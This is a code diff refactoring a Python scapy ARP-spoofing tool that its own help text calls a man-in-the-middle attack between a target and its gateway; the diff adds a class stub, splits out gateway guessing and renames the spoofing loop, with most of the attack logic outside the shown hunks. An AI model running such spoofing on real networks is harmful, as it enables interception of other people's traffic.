@@ -4,27 +4,14 @@
 
 import time
 import scapy.all as scapy
-import argparse
 
 # TODO: Implement OOJ to control flow of the spoofing (i.e. when to stop).
 
-
-def get_arguments():
-    parser = argparse.ArgumentParser(description="Performs a man-in-the-middle attack between two given IP addresses.")
-    parser.add_argument(dest="target", help="target address of spoofed device")
-    parser.add_argument("-g", "--gateway", dest="gateway", help="default gateway for the target device")
-    arguments = parser.parse_args()
-
-    if arguments.target is None:
-        parser.error("[-] please specify a target IP address, use --help for more information")
-    if arguments.gateway is None:
-        # TODO: Add gateway based on a search on LAN and choose the default gateway of user's device.
-        address = arguments.target.split(".")
-        address[3] = "1"
-        arguments.gateway = ".".join(address)
-        print(f"[-] Gateway address was not specified. Using default address ({arguments.gateway})")
-
-    return arguments
+class ARPSpoofer:
+    def __init__(self, target_ip, gateway_ip):
+        self.target_ip = target_ip
+        self.gateway_ip = gateway_ip
+        self.is_running = True
 
 
 def get_mac(ip):
@@ -52,13 +39,16 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
-def stop_spoofing(target_ip, gateway_ip):
-    restore(target_ip, gateway_ip)
-    restore(gateway_ip, target_ip)
+def get_default_gateway(target_ip):
+    address = target_ip.split(".")
+    address[3] = "1"
+    gateway_ip = ".".join(address)
+    print(f"[-] Gateway address was not specified. Using default address ({gateway_ip})")
+    return gateway_ip
 
 
-# TODO: Separate it somehow to have the ability to stop spoofing.
-def perform_spoofing(target_ip, gateway_ip):
+# TODO: Implement into class.
+def start_spoofing(target_ip, gateway_ip):
     sent_packets_count = 0
     try:
         while True:
@@ -71,3 +61,8 @@ def perform_spoofing(target_ip, gateway_ip):
     except KeyboardInterrupt:
         print("\n[+] Execution aborted. Restoring ARP tables...")
         stop_spoofing(target_ip, gateway_ip)
+
+
+def stop_spoofing(target_ip, gateway_ip):
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
